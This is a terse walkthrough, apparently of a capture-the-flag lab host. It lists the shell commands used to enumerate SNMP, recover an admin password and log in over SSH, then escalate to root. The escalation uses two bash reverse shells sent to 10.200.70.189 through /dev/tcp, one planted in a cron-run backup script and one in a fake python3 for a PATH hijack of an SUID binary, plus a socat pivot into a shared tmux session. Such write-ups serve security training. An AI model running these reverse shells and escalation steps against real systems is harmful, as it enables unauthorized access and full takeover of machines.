```zsh
nmap -sU --top-ports 20 10.0.23.86 -oN udp.txt
#port 161
onesixtyone 10.0.23.86 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
#`public` community string found
snmp-check 10.0.23.86 -c public
#after a long wait, Admin Layne.Stanley: 5t6^jahTRjab' found
#but the ' at the end was prolly a typo

ssh layne.stanley@10.0.23.86
#5t6^jahTRjab
Stanley! #1001

#In stanley's home, we find a bankSmarter_backup.sh, write protected.
#Running pspy, we see #1002 is running bankSmarter_backup.sh
#Although it is write-protected, we can just rename it, and write a new bankSmarter_backup.sh
echo "bash -c 'bash -i >& /dev/tcp/10.200.70.189/22 0>&1'" > bankSmarter_backup.sh
#scott! #1002

#In scott's bash_history, we see he has used socat to connect to ronnie's tmux shared sessh using
socat stdio unix-connect:/opt/bank/sockets/live.sock
#ronnie #1003

#There's an SUID binary, bank_backupd, which essentially calls a readable bank_backup.py, and the first line of the code is
#!/usr/bin/env python3
#Which essentially means, use whichever python3 you find, to run this file

#So, now with $PATH var manipulation, we can essentially write a malicious file called python3, and run the SUID as 1003, to get a root shell

cd /tmp
echo "bash -c 'bash -i >& /dev/tcp/10.200.70.189/80 0>&1'" > python3
chmod +x python3
PATH=$(pwd):$PATH
bank_backupd
#root!
```